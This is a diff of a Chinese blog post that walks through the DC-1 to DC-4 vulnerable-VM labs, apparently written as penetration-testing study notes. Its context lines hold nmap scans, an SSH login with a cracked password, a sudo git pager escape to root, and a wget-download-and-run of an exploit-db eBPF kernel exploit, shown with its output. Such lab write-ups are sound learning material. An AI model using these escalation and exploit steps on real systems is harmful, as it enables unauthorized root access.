@@ -6,15 +6,15 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://knlvre.github.io/Knlvre.github-io">
-  <title>渗透学习 — DC1-DC8系列靶机渗透测试 | Knlvre</title>
+  <title>渗透学习 — DC-1至DC-4靶机渗透测试 | Knlvre</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前言由于网络环境的变化，攻击机和靶机的IP可能发生改变。在每道题目中如果有改变，我会在开头的环境中写出来 DC1环境虚拟机平台：VMware Workstation Pro 攻击机：Kali（IP：192.168.43.84） 靶机：DC1（IP：192.168.43.27） 渗透测试打开DC1靶机之后，需要输入登录的账号和密码，但是却不知道  由于IP也不知道，所以没有目标下手，所以需要获取靶机">
+  <meta name="description" content="前言由于网络环境的变化，攻击机和靶机的IP可能发生改变。在每道题目中如果有改变，我会在开头的环境中写出来 DC-1环境虚拟机平台：VMware Workstation Pro 攻击机：Kali（IP：192.168.43.84） 靶机：DC-1（IP：192.168.43.27） 渗透测试打开DC1靶机之后，需要输入登录的账号和密码，但是却不知道  由于IP也不知道，所以没有目标下手，所以需要获取">
 <meta name="keywords" content="渗透测试">
 <meta property="og:type" content="article">
-<meta property="og:title" content="渗透学习 — DC1-DC8系列靶机渗透测试">
+<meta property="og:title" content="渗透学习 — DC-1至DC-4靶机渗透测试">
 <meta property="og:url" content="https://knlvre.github.io/Knlvre.github-io/2019/09/17/DC1-DC4系列靶机渗透测试/index.html">
 <meta property="og:site_name" content="Knlvre">
-<meta property="og:description" content="前言由于网络环境的变化，攻击机和靶机的IP可能发生改变。在每道题目中如果有改变，我会在开头的环境中写出来 DC1环境虚拟机平台：VMware Workstation Pro 攻击机：Kali（IP：192.168.43.84） 靶机：DC1（IP：192.168.43.27） 渗透测试打开DC1靶机之后，需要输入登录的账号和密码，但是却不知道  由于IP也不知道，所以没有目标下手，所以需要获取靶机">
+<meta property="og:description" content="前言由于网络环境的变化，攻击机和靶机的IP可能发生改变。在每道题目中如果有改变，我会在开头的环境中写出来 DC-1环境虚拟机平台：VMware Workstation Pro 攻击机：Kali（IP：192.168.43.84） 靶机：DC-1（IP：192.168.43.27） 渗透测试打开DC1靶机之后，需要输入登录的账号和密码，但是却不知道  由于IP也不知道，所以没有目标下手，所以需要获取">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-1.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-2.png">
@@ -64,10 +64,10 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-2.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-3.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-4.png">
-<meta property="og:updated_time" content="2019-09-24T08:29:18.657Z">
+<meta property="og:updated_time" content="2019-09-26T02:30:52.531Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="渗透学习 — DC1-DC8系列靶机渗透测试">
-<meta name="twitter:description" content="前言由于网络环境的变化，攻击机和靶机的IP可能发生改变。在每道题目中如果有改变，我会在开头的环境中写出来 DC1环境虚拟机平台：VMware Workstation Pro 攻击机：Kali（IP：192.168.43.84） 靶机：DC1（IP：192.168.43.27） 渗透测试打开DC1靶机之后，需要输入登录的账号和密码，但是却不知道  由于IP也不知道，所以没有目标下手，所以需要获取靶机">
+<meta name="twitter:title" content="渗透学习 — DC-1至DC-4靶机渗透测试">
+<meta name="twitter:description" content="前言由于网络环境的变化，攻击机和靶机的IP可能发生改变。在每道题目中如果有改变，我会在开头的环境中写出来 DC-1环境虚拟机平台：VMware Workstation Pro 攻击机：Kali（IP：192.168.43.84） 靶机：DC-1（IP：192.168.43.27） 渗透测试打开DC1靶机之后，需要输入登录的账号和密码，但是却不知道  由于IP也不知道，所以没有目标下手，所以需要获取">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-1.png">
   
     <link rel="alternative" href="/atom.xml" title="Knlvre" type="application/atom+xml">
@@ -193,7 +193,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      渗透学习 — DC1-DC8系列靶机渗透测试
+      渗透学习 — DC-1至DC-4靶机渗透测试
     </h1>
   
 
@@ -207,9 +207,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于网络环境的变化，攻击机和靶机的IP可能发生改变。在每道题目中如果有改变，我会在开头的环境中写出来</p>
-<h1 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
+<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
 <p>攻击机：Kali（IP：192.168.43.84）</p>
-<p>靶机：DC1（IP：192.168.43.27）</p>
+<p>靶机：DC-1（IP：192.168.43.27）</p>
 <h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>打开DC1靶机之后，需要输入登录的账号和密码，但是却不知道</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-1.png" alt="1-1"></p>
 <p>由于IP也不知道，所以没有目标下手，所以需要获取靶机的IP地址。Kali上使用<code>Nmap</code>扫描本网段下的所有主机</p>
@@ -299,9 +299,9 @@
 <p>爆破出密码为<code>orange</code>，用ssh去连接登录</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh flag4@192.168.43.27</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-25.png" alt="1-25"></p>
-<h1 id="DC2"><a href="#DC2" class="headerlink" title="DC2"></a>DC2</h1><h2 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
+<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><h2 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
 <p>攻击机：Kali（IP：192.168.43.84或192.168.2.107）</p>
-<p>靶机：DC2（IP：192.168.43.10或192.168.2.109）</p>
+<p>靶机：DC-2（IP：192.168.43.10或192.168.2.109）</p>
 <h2 id="渗透测试-1"><a href="#渗透测试-1" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>打开DC2靶机之后，照样利用<code>Nmap</code>扫描攻击机的网段，找到DC2的IP地址之后，扫描DC2的端口开放情况</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.43.0/24</span><br><span class="line">nmap -sV 192.168.43.10</span><br></pre></td></tr></table></figure>
 <p>扫描结果显示开放80端口，但是访问时却访问不了，用<code>-A</code>选项扫一下</p>
@@ -374,9 +374,9 @@
 </blockquote>
 <p>表面上说没有提示，但是最后一句话有<code>git</code>单词，提示我们利用git提权。提权成功后，拿到了最后的flag</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo git -p help config</span></span><br><span class="line"><span class="comment"># !/bin/sh</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="comment"># cd ~</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="comment"># cat final-flag.txt</span></span><br><span class="line"></span><br><span class="line">jerry@DC-2:~$ sudo git -p <span class="built_in">help</span> config</span><br><span class="line">GIT-CONFIG(1)  ...</span><br><span class="line">NAME</span><br><span class="line">       git-config - Get and <span class="built_in">set</span> repository or global options</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       git config [&lt;file-option&gt;] [<span class="built_in">type</span>] [-z|--null] name [value [value_regex]]</span><br><span class="line">       git config [&lt;file-option&gt;] [<span class="built_in">type</span>] --add name value</span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       You can query/<span class="built_in">set</span>/replace/<span class="built_in">unset</span> options with this <span class="built_in">command</span>. The name is actually the section and the key separated by a dot, and the</span><br><span class="line">       ...</span><br><span class="line">       expansion (see --path below). If no <span class="built_in">type</span> specifier is passed, no checks or transformations are performed on the value.</span><br><span class="line">!/bin/sh</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># cd ~</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">final-flag.txt</span><br><span class="line"><span class="comment"># cat final-flag.txt</span></span><br><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span><br><span class="line">\ \/  \/ / _ \ | |  / _` |/ _ \| <span class="string">'_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulatons!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A special thanks to all those who sent me tweets</span></span><br><span class="line"><span class="string">and provided me with feedback - it'</span>s all greatly</span><br><span class="line">appreciated.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>
-<h1 id="DC3"><a href="#DC3" class="headerlink" title="DC3"></a>DC3</h1><h2 id="环境-2"><a href="#环境-2" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
+<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><h2 id="环境-2"><a href="#环境-2" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
 <p>攻击机：Kali（IP：192.168.43.84）</p>
-<p>靶机：DC3（IP：192.168.43.134）</p>
+<p>靶机：DC-3（IP：192.168.43.134）</p>
 <h2 id="渗透测试-2"><a href="#渗透测试-2" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><code>nmap</code>扫描靶机，发现只开启了80端口，浏览器访问</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-1.png" alt="3-1"></p>
 <p>利用前段时间学长给的工具<code>gwhatweb</code>，知道了网站框架是<code>Joomla(逐浪)</code></p>
@@ -417,9 +417,9 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">$ pwd</span><br><span class="line">/var/www/html/templates/protostar</span><br><span class="line">$ ls</span><br><span class="line">component.php</span><br><span class="line">css</span><br><span class="line">...</span><br><span class="line">$ mkdir 39772</span><br><span class="line">$ cd 39772</span><br><span class="line">$ wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br><span class="line">--2019-09-23 16:01:08--  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br><span class="line">...</span><br><span class="line">2019-09-23 16:01:10 (4.38 MB/s) - &apos;39772.zip&apos; saved [7025/7025]</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">39772.zip</span><br><span class="line">$ unzip 39772.zip</span><br><span class="line">Archive:  39772.zip</span><br><span class="line">   creating: 39772/</span><br><span class="line">  inflating: 39772/.DS_Store         </span><br><span class="line">   creating: __MACOSX/</span><br><span class="line">   creating: __MACOSX/39772/</span><br><span class="line">  inflating: __MACOSX/39772/._.DS_Store  </span><br><span class="line">  inflating: 39772/crasher.tar       </span><br><span class="line">  inflating: __MACOSX/39772/._crasher.tar  </span><br><span class="line">  inflating: 39772/exploit.tar       </span><br><span class="line">  inflating: __MACOSX/39772/._exploit.tar  </span><br><span class="line">$ ls</span><br><span class="line">39772</span><br><span class="line">39772.zip</span><br><span class="line">__MACOSX</span><br><span class="line">$ cd 39772</span><br><span class="line">$ ls</span><br><span class="line">crasher.tar</span><br><span class="line">exploit.tar</span><br><span class="line">$ tar -xvf exploit.tar</span><br><span class="line">ebpf_mapfd_doubleput_exploit/</span><br><span class="line">ebpf_mapfd_doubleput_exploit/hello.c</span><br><span class="line">ebpf_mapfd_doubleput_exploit/suidhelper.c</span><br><span class="line">ebpf_mapfd_doubleput_exploit/compile.sh</span><br><span class="line">ebpf_mapfd_doubleput_exploit/doubleput.c</span><br><span class="line">$ ls</span><br><span class="line">crasher.tar</span><br><span class="line">ebpf_mapfd_doubleput_exploit</span><br><span class="line">exploit.tar</span><br><span class="line">$ cd ebpf_mapfd_doubleput_exploit</span><br><span class="line">$ ls</span><br><span class="line">compile.sh</span><br><span class="line">doubleput.c</span><br><span class="line">hello.c</span><br><span class="line">suidhelper.c</span><br><span class="line">$ ./compile.sh</span><br><span class="line">doubleput.c: In function &apos;make_setuid&apos;:</span><br><span class="line">doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]</span><br><span class="line">    .insns = (__aligned_u64) insns,</span><br><span class="line">             ^</span><br><span class="line">doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]</span><br><span class="line">    .license = (__aligned_u64)&quot;&quot;</span><br><span class="line">               ^</span><br><span class="line">$ ls</span><br><span class="line">compile.sh</span><br><span class="line">doubleput</span><br><span class="line">doubleput.c</span><br><span class="line">hello</span><br><span class="line">hello.c</span><br><span class="line">suidhelper</span><br><span class="line">suidhelper.c</span><br><span class="line">$ ./doubleput</span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. if this worked, you&apos;ll have a root shell in &lt;=60 seconds.</span><br><span class="line">suid file detected, launching rootshell...</span><br><span class="line">we have root privs now...</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>
 <p>执行<code>compile.sh</code>的过程中好像报错了，但是不要紧，还是生成了<code>doubleput</code>，执行后拿到了<code>root</code>权限，拿到了flag</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls</span><br><span class="line">the-flag.txt</span><br><span class="line">cat the-flag.txt</span><br><span class="line"> __        __   _ _   ____                   _ _ _ _ </span><br><span class="line"> \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |</span><br><span class="line">  \ \ /\ / / _ \ | | | | | |/ _ \| &apos;_ \ / _ \ | | | |</span><br><span class="line">   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|</span><br><span class="line">    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)</span><br><span class="line">                                                     </span><br><span class="line"></span><br><span class="line">Congratulations are in order for completing DC-3VM.  :-)</span><br><span class="line"></span><br><span class="line">I hope you&apos;ve enjoyed this challenge as much as I enjoyed making it.</span><br><span class="line"></span><br><span class="line">If there are any ways that I can improve these little challenges,</span><br><span class="line">please let me know.</span><br><span class="line"></span><br><span class="line">As per usual, comments and complaints can be sent via Twitter to @DCAU7</span><br><span class="line"></span><br><span class="line">Have a great day!!!!</span><br></pre></td></tr></table></figure>
-<h1 id="DC4"><a href="#DC4" class="headerlink" title="DC4"></a>DC4</h1><h2 id="环境-3"><a href="#环境-3" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
+<h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><h2 id="环境-3"><a href="#环境-3" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
 <p>攻击机：Kali（IP：192.168.43.84）</p>
-<p>靶机：DC4（IP：192.168.43.193）</p>
+<p>靶机：DC-4（IP：192.168.43.193）</p>
 <h2 id="渗透测试-3"><a href="#渗透测试-3" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><code>nmap</code>扫描靶机，发现开启了<code>22</code>和<code>80</code>端口</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@Knlvre:~# nmap -p1-65535 -A 192.168.43.193</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-23 14:20 CST</span><br><span class="line">Nmap scan report for dc-4 (192.168.43.193)</span><br><span class="line">Host is up (0.00069s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.15.10</span><br><span class="line">|_http-server-header: nginx/1.15.10</span><br><span class="line">|_http-title: System Tools</span><br><span class="line">MAC Address: 00:0C:29:CA:EC:58 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.69 ms dc-4 (192.168.43.193)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 15.91 seconds</span><br></pre></td></tr></table></figure>
 <p>访问80端口，是一个登录页面，没有次数、验证码之类的限制</p>
@@ -562,14 +562,14 @@
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          渗透学习 — MS17-010（CVE-2017-0143）复现
+          渗透学习 — CVE-2017-0143（MS17-010）复现
         
       </div>
     </a>
   
   
     <a href="/Knlvre.github-io/2019/09/17/DC5-DC8系列靶机渗透测试/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">渗透学习 — DC1-DC4系列靶机渗透测试</div>
+      <div class="article-nav-title">渗透学习 — DC-5至DC-8靶机渗透测试</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -699,6 +699,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
               </li>
              
@@ -712,10 +716,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">博客搭建</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
             
             <div class="clearfix"></div>
